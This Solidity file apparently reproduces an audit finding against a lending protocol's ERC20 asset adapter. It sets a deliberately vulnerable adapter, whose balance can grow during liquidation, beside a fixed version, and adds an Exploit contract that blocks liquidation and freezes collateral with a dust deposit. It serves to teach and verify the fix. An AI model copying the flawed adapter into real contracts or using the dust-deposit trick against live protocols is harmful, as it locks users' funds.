// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum — Pashov H-28, review dated 2025-05-06.
    validateLiquidationData requires the stored balance to equal the liquidation
    amount. depositAsset still adds to that balance after liquidation starts, so
    the liquidator reverts and the collateral cannot be withdrawn either.
*/

contract Token {
    string public symbol = "RAAC";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IAssetAdapter {
    function validateLiquidationData(address user, bytes calldata data) external view returns (bool);
    function deposit(address user, bytes calldata data) external;
    function seize(address user, address to) external;
}

contract ERC20AssetAdapter {
    Token public token;
    address public lendingPool;
    mapping(address => uint256) public _balances;

    event TokenDeposited(address token, address user, uint256 amount);

    modifier onlyLendingPool() {
        require(msg.sender == lendingPool, "pool");
        _;
    }

    constructor(Token _token) {
        token = _token;
    }

    function setLendingPool(address pool) external {
        require(lendingPool == address(0), "set");
        lendingPool = pool;
    }

    function validateLiquidationData(address user, bytes calldata data) external view returns (bool) {
        uint256 amount = abi.decode(data, (uint256));
        return _balances[user] == amount;
    }

    function deposit(address user, bytes calldata data) external onlyLendingPool {
        uint256 amount = abi.decode(data, (uint256));
        require(amount > 0, "ERC20Adapter: invalid amount");
        // @> VULN: _balances[user] grows during liquidation, so the stored liquidation amount no longer matches
        _balances[user] += amount;
        token.transferFrom(user, address(this), amount);
        emit TokenDeposited(address(token), user, amount);
    }

    function seize(address user, address to) external onlyLendingPool {
        uint256 amount = _balances[user];
        _balances[user] = 0;
        require(token.transfer(to, amount), "seize");
    }
}

contract ERC20AssetAdapterFixed {
    Token public token;
    address public lendingPool;
    mapping(address => bool) public underLiquidation;
    mapping(address => uint256) public _balances;

    error DepositsDisabledDuringLiquidation();

    constructor(Token _token) {
        token = _token;
    }

    function setLendingPool(address pool) external {
        lendingPool = pool;
    }

    function validateLiquidationData(address user, bytes calldata data) external view returns (bool) {
        uint256 amount = abi.decode(data, (uint256));
        return _balances[user] == amount;
    }

    function deposit(address user, bytes calldata data) external {
        require(msg.sender == lendingPool, "pool");
        if (underLiquidation[user]) revert DepositsDisabledDuringLiquidation();
        uint256 amount = abi.decode(data, (uint256));
        require(amount > 0, "amount");
        _balances[user] += amount;
        token.transferFrom(user, address(this), amount);
    }

    function markLiquidation(address user) external {
        require(msg.sender == lendingPool, "pool");
        underLiquidation[user] = true;
    }

    function seize(address user, address to) external {
        require(msg.sender == lendingPool, "pool");
        uint256 amount = _balances[user];
        _balances[user] = 0;
        underLiquidation[user] = false;
        require(token.transfer(to, amount), "seize");
    }
}

contract LendingPool {
    ERC20AssetAdapter public adapter;
    mapping(address => bool) public vaultOpened;
    mapping(address => bool) public underLiquidation;

    error VaultPositionNotOpened();

    constructor(ERC20AssetAdapter _adapter) {
        adapter = _adapter;
    }

    function openVault() external {
        vaultOpened[msg.sender] = true;
    }

    function depositAsset(address adapter_, bytes calldata data) external {
        if (!vaultOpened[msg.sender]) revert VaultPositionNotOpened();
        require(adapter_ == address(adapter), "adapter");
        IAssetAdapter(adapter_).deposit(msg.sender, data);
    }

    function initiateLiquidation(address user, bytes calldata data) external {
        require(adapter.validateLiquidationData(user, data), "match");
        underLiquidation[user] = true;
    }

    function withdrawAsset() external view {
        require(!underLiquidation[msg.sender], "frozen");
    }
}

contract StabilityPool {
    error CollateralAndParamterDataMismatch();

    ERC20AssetAdapter public adapter;

    constructor(ERC20AssetAdapter _adapter) {
        adapter = _adapter;
    }

    function liquidateBorrower(address poolAdapter, address vaultAdapter, address user, bytes calldata data) external {
        vaultAdapter;
        if (!IAssetAdapter(poolAdapter).validateLiquidationData(user, data)) revert CollateralAndParamterDataMismatch();
        IAssetAdapter(poolAdapter).seize(user, msg.sender);
    }
}

contract LendingPoolFixed {
    ERC20AssetAdapterFixed public adapter;
    mapping(address => bool) public vaultOpened;

    constructor(ERC20AssetAdapterFixed _adapter) {
        adapter = _adapter;
    }

    function openVault() external {
        vaultOpened[msg.sender] = true;
    }

    function depositAsset(bytes calldata data) external {
        require(vaultOpened[msg.sender], "vault");
        adapter.deposit(msg.sender, data);
    }

    function initiateLiquidation(address user) external {
        adapter.markLiquidation(user);
    }

    function liquidate(address user, bytes calldata data) external {
        require(adapter.validateLiquidationData(user, data), "match");
        adapter.seize(user, msg.sender);
    }
}

contract Exploit {
    uint256 public constant COLLATERAL = 1000 ether;
    uint256 public constant DUST = 1;

    Token public token;
    ERC20AssetAdapter public adapter;
    LendingPool public pool;
    StabilityPool public stability;
    bool public liquidationReverted;
    bool public withdrawReverted;
    uint256 public locked;
    uint256 public recorded;

    constructor() {
        token = new Token();
        adapter = new ERC20AssetAdapter(token);
        pool = new LendingPool(adapter);
        stability = new StabilityPool(adapter);
        adapter.setLendingPool(address(pool));
    }

    function run() external {
        token.mint(address(this), COLLATERAL + DUST);
        token.approve(address(adapter), COLLATERAL + DUST);
        pool.openVault();
        pool.depositAsset(address(adapter), abi.encode(COLLATERAL));
        pool.initiateLiquidation(address(this), abi.encode(COLLATERAL));
        pool.depositAsset(address(adapter), abi.encode(DUST));
        try stability.liquidateBorrower(address(adapter), address(adapter), address(this), abi.encode(COLLATERAL)) {
            liquidationReverted = false;
        } catch {
            liquidationReverted = true;
        }
        try pool.withdrawAsset() {
            withdrawReverted = false;
        } catch {
            withdrawReverted = true;
        }
        locked = token.balanceOf(address(adapter));
        recorded = adapter._balances(address(this));
        require(liquidationReverted, "seized");
        require(withdrawReverted, "withdrew");
        require(locked == COLLATERAL + DUST, "locked");
        require(recorded == COLLATERAL + DUST, "balance");
    }
}
